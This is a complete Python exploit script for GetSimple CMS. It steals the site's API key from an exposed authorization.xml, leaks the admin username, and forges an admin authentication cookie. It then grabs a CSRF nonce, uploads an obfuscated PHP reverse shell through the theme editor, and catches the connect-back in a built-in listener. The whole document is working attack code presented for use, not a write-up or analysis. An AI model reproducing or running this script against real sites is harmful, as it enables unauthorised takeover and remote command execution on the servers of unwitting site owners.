import re
import sys
import socket
import hashlib
import requests
import telnetlib
from threading import Thread
from xml.etree import ElementTree
 
class gscms_pwner:
 
    def __init__(self, target, path, username, cb_host, cb_port):
        self.target  = target
        self.path    = path
        self.un      = username
        self.cb_host = cb_host
        self.cb_port = cb_port
        self.version = None
        self.apikey  = None
 
    def set_headers(self):
        self.h = {
            'Content-Type':'application/x-www-form-urlencoded',
            'Cookie': self.cookies
        }
 
    def set_cookies(self):
        self.cookies = "GS_ADMIN_USERNAME=%s;%s=%s" % (self.un, self.get_cookie_name(), self.get_cookie_value())
        self.set_headers()
 
    def get_cookie_name(self):
        cn = "getsimple_cookie_%s%s" % (self.version.replace(".", ""), self.apikey)
        sha1 = hashlib.sha1()
        sha1.update(cn)
        return sha1.hexdigest()
 
    def get_cookie_value(self):
        cv = "%s%s" % (self.un, self.apikey)
        sha1 = hashlib.sha1()
        sha1.update(cv)
        return sha1.hexdigest()
 
    def get_version(self):
        print "(+) fingerprinting the targets version"
        r = requests.get("http://%s%sadmin/index.php" % (self.target, self.path))
        match = re.search("jquery.getsimple.js\?v=(.*)\"", r.text)
        if match:
            self.version = match.group(1)
            print "(+) found version: %s" % self.version
            return True
        return False
 
    def check_htaccess(self):
        print "(+) checking .htaccess exposure..."
        r = requests.get("http://%s%sdata/other/authorization.xml" % (self.target, self.path))
        if r.ok:
            tree = ElementTree.fromstring(r.content)
            self.apikey = tree[0].text
            print "(+) leaked key: %s" % self.apikey
            return True
        return False
 
    def check_username_disclosure(self):
        print "(+) no username provided, attempting username leak..."
        r = requests.get("http://%s%sdata/users/" % (self.target, self.path))
        match = re.search("href=\"(.*).xml\"", r.text)
        if match:
            self.un = match.group(1)
            print "(+) found username: %s" % self.un
            return True
        return False
 
    def get_nonce(self):
        r = requests.get("http://%s%sadmin/theme-edit.php" % (self.target, self.path), headers=self.h)
        m = re.search('nonce" type="hidden" value="(.*)"', r.text)
        if m:
            print("(+) obtained csrf nonce: %s" % m.group(1))
            return m.group(1)
        return None
 
    def upload(self, fname, content):
            n = self.get_nonce()
            if n != None:
                try:
                    p = {
                        'submitsave': 2,
                        'edited_file': fname,
                        'content': content,
                        'nonce': n
                    }
                    r = requests.post("http://%s%sadmin/theme-edit.php" % (self.target, self.path), headers=self.h, data=p)
                    if 'CSRF detected!' not in r.text:
                        print('(+) shell uploaded to http://%s%stheme/%s' % (self.target, self.path, fname))
                        return True
                    else: print("(-) couldn't upload shell %s " % fname) 
                except Exception as e:
                    print(e)
            return False
 
    # build the reverse php shell
    def build_php_code(self):
        phpkode  = ("""
        @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);""")
        phpkode += ("""$dis=@ini_get('disable_functions');""")
        phpkode += ("""if(!empty($dis)){$dis=preg_replace('/[, ]+/', ',', $dis);$dis=explode(',', $dis);""")
        phpkode += ("""$dis=array_map('trim', $dis);}else{$dis=array();} """)
        phpkode += ("""if(!function_exists('LcNIcoB')){function LcNIcoB($c){ """)
        phpkode += ("""global $dis;if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {$c=$c." 2>&1\\n";} """)
        phpkode += ("""$imARhD='is_callable';$kqqI='in_array';""")
        phpkode += ("""if($imARhD('popen')and!$kqqI('popen',$dis)){$fp=popen($c,'r');""")
        phpkode += ("""$o=NULL;if(is_resource($fp)){while(!feof($fp)){ """)
        phpkode += ("""$o.=fread($fp,1024);}}@pclose($fp);}else""")
        phpkode += ("""if($imARhD('proc_open')and!$kqqI('proc_open',$dis)){ """)
        phpkode += ("""$handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes); """)
        phpkode += ("""$o=NULL;while(!feof($pipes[1])){$o.=fread($pipes[1],1024);} """)
        phpkode += ("""@proc_close($handle);}else if($imARhD('system')and!$kqqI('system',$dis)){ """)
        phpkode += ("""ob_start();system($c);$o=ob_get_contents();ob_end_clean(); """)
        phpkode += ("""}else if($imARhD('passthru')and!$kqqI('passthru',$dis)){ob_start();passthru($c); """)
        phpkode += ("""$o=ob_get_contents();ob_end_clean(); """)
        phpkode += ("""}else if($imARhD('shell_exec')and!$kqqI('shell_exec',$dis)){ """)
        phpkode += ("""$o=shell_exec($c);}else if($imARhD('exec')and!$kqqI('exec',$dis)){ """)
        phpkode += ("""$o=array();exec($c,$o);$o=join(chr(10),$o).chr(10);}else{$o=0;}return $o;}} """)
        phpkode += ("""$nofuncs='no exec functions'; """)
        phpkode += ("""if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){ """)
        phpkode += ("""$s=@fsockopen('tcp://%s','%d');while($c=fread($s,2048)){$out = ''; """ % (self.cb_host, self.cb_port))
        phpkode += ("""if(substr($c,0,3) == 'cd '){chdir(substr($c,3,-1)); """)
        phpkode += ("""}elseif (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit'){break;}else{ """)
        phpkode += ("""$out=LcNIcoB(substr($c,0,-1));if($out===false){fwrite($s,$nofuncs); """)
        phpkode += ("""break;}}fwrite($s,$out);}fclose($s);}else{ """)
        phpkode += ("""$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);@socket_connect($s,'%s','%d'); """ % (self.cb_host, self.cb_port))
        phpkode += ("""@socket_write($s,"socket_create");while($c=@socket_read($s,2048)){ """)
        phpkode += ("""$out = '';if(substr($c,0,3) == 'cd '){chdir(substr($c,3,-1)); """)
        phpkode += ("""} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') { """)
        phpkode += ("""break;}else{$out=LcNIcoB(substr($c,0,-1));if($out===false){ """)
        phpkode += ("""@socket_write($s,$nofuncs);break;}}@socket_write($s,$out,strlen($out)); """)
        phpkode += ("""}@socket_close($s);} """)
        return phpkode
 
    def handler(self):
        print "(+) starting handler on port %d" % self.cb_port
        t = telnetlib.Telnet()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", self.cb_port))
        s.listen(1)
        conn, addr = s.accept()
        print "(+) connection from %s" % addr[0]
        t.sock = conn
        print "(+) pop thy shell!"
        t.interact()
 
    def exec_code(self):
        handlerthr = Thread(target=self.handler)
        handlerthr.start()
        requests.get("http://%s/%s/theme/poc.php" % (self.target, self.path))
 
    def exploit(self):
        print "(+) targeting: http://%s%s" % (self.target, self.path)
        if self.get_version():
            if self.check_htaccess():
                if self.un == None:
                    # requires directory listing
                    self.check_username_disclosure()
                self.set_cookies()
                self.upload('poc.php', "<?php %s" % self.build_php_code())
                print "(+) triggering connectback to: %s:%d" % (self.cb_host, self.cb_port)
                self.exec_code()
        else:
            print "(-) invalid target uri!"
            sys.exit(-1)
 
def main():
    if len(sys.argv) < 4:
        print "(+) usage: %s <target> <path> <connectback:port> [username]" % sys.argv[0]
        print "(+) eg: %s 172.16.175.156 /" % sys.argv[0]
        print "(+) eg: %s 172.16.175.156 /GetSimpleCMS-3.3.15/ 172.16.175.1:909" % sys.argv[0]
        print "(+) eg: %s 172.16.175.156 /GetSimpleCMS-3.3.15/ 172.16.175.1:909 admin" % sys.argv[0]
        sys.exit(1)
    t = sys.argv[1]
    p = sys.argv[2]
    if not p.endswith("/"):
        p += "/"
    if not p.startswith("/"):
        p = "/%s" % p
    if ":" not in sys.argv[3]:
        cb_port = 4444
        cb_host = sys.argv[3]
    else:
        cb_port = sys.argv[3].split(":")[1]
        cb_host = sys.argv[3].split(":")[0]
        if not cb_port.isdigit():
            cb_port = 4444
        else:
            cb_port = int(cb_port)
    u = None
    if len(sys.argv) == 5:
        u = sys.argv[4]
    gp = gscms_pwner(t, p, u, cb_host, cb_port)
    gp.exploit()
 
if __name__ == '__main__':
    main()
